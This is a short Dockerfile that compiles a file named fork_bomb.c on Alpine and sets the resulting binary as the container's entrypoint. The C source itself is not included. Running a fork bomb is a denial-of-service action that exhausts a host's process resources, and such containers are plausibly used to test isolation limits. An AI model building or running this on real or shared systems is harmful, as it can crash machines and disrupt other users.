FROM alpine
RUN apk update &&\
	  apk upgrade && \
		apk add gcc build-base

ADD fork_bomb.c fork_bomb.c
RUN gcc fork_bomb.c -o fork_bomb
ENTRYPOINT /fork_bomb
